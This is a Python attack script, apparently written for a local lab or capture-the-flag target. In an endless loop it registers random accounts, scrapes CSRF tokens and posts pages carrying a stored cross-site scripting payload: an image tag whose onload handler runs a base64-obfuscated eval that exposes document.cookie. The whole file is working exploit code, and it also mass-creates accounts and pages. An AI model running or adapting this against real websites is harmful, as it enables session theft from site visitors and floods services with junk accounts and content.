import requests
import uuid

# Create new user
user_count = 0
page_count = 0

while True:
    print("%d user registered, %d page created." % (user_count, page_count))
    s = requests.Session()

    username = str(uuid.uuid4()).replace('-', '')
    password = str(uuid.uuid4())

    reg_data = {
        'username': username,
        'password': password,
        'password_confirmation': password,
    }

    s.post('http://127.0.0.1:8080/registration.php', data=reg_data)
    user_count += 1

    for i in range(0, 5):
        new_page_text = s.get('http://127.0.0.1:8080/new_page.php').text
        csrf_token = new_page_text.split('"csrf_token" value="')[1].split('"')[0]
        eploit = '''
        <img
        src="https://image.shutterstock.com/image-vector/example-signlabel-features-speech-bubble-260nw-1223219848.jpg"
        onload="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))"
        >
        '''

        eploit_id = str(uuid.uuid4())
        page_data = {
            'name': 'eploit_' + eploit_id,
            'content': eploit,
            'csrf_token': csrf_token,
        }

        response = s.post('http://127.0.0.1:8080/new_page.php', data=page_data)
        print("Response: " + response.text.split('<div class="panel-heading">')[1].split('</div>')[0].strip())
        page_count += 1